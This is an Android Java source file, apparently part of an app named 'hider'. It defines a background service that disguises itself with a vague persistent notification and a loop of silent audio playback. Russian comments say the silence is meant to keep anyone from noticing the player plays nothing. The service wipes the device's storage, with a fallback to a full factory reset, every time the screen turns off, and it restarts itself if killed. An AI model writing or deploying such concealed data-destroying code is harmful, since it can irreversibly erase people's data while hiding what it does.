package com.example.hider;

import android.app.*;
import android.app.admin.DevicePolicyManager;
import android.content.*;
import android.content.pm.ServiceInfo;
import android.media.AudioFormat;
import android.media.AudioManager;
import android.media.AudioTrack;
import android.os.Build;
import android.os.IBinder;

public class WatcherService extends Service {
    private static final String CH_ID = "GuardChan";
    private AudioTrack track;
    private BroadcastReceiver receiver;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // 1. Канал (на API 29 он уже обязан быть)
        NotificationManager nm = getSystemService(NotificationManager.class);
        if (nm.getNotificationChannel(CH_ID) == null) {
            nm.createNotificationChannel(new NotificationChannel(CH_ID, "Sec", NotificationManager.IMPORTANCE_LOW));
        }

        // 2. Уведомление
        Notification notif = new Notification.Builder(this, CH_ID)
                .setContentTitle("Active")
                .setSmallIcon(android.R.drawable.ic_lock_lock)
                .setOngoing(true)
                .build();

        // 3. Прыжок в Foreground
        if (Build.VERSION.SDK_INT >= 34) {
            startForeground(1, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PLAYBACK);
        } else {
            startForeground(1, notif);
        }

        // 4. Генератор тишины (чтобы не докопались, что плеер молчит)
        if (track == null) {
            int bSize = AudioTrack.getMinBufferSize(8000, AudioFormat.CHANNEL_OUT_MONO, AudioFormat.ENCODING_PCM_16BIT);
            track = new AudioTrack(AudioManager.STREAM_MUSIC, 8000, AudioFormat.CHANNEL_OUT_MONO, AudioFormat.ENCODING_PCM_16BIT, bSize, AudioTrack.MODE_STREAM);
            track.play();
            new Thread(() -> {
                byte[] b = new byte[1024];
                while (track != null) { 
                    try { track.write(b, 0, b.length); } catch (Exception e) { break; }
                }
            }).start();
        }

        // 5. Ресивер (сразу вайп при выключении экрана)
        if (receiver == null) {
            receiver = new BroadcastReceiver() {
                @Override
                public void onReceive(Context context, Intent intent) {
                    if (Intent.ACTION_SCREEN_OFF.equals(intent.getAction())) {
                        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                        try { dpm.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE); } 
                        catch (Exception e) { dpm.wipeData(0); }
                    }
                }
            };
            IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_OFF);
            if (Build.VERSION.SDK_INT >= 34) registerReceiver(receiver, filter, RECEIVER_EXPORTED);
            else registerReceiver(receiver, filter);
        }

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        if (track != null) { track.stop(); track.release(); track = null; }
        if (receiver != null) unregisterReceiver(receiver);
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
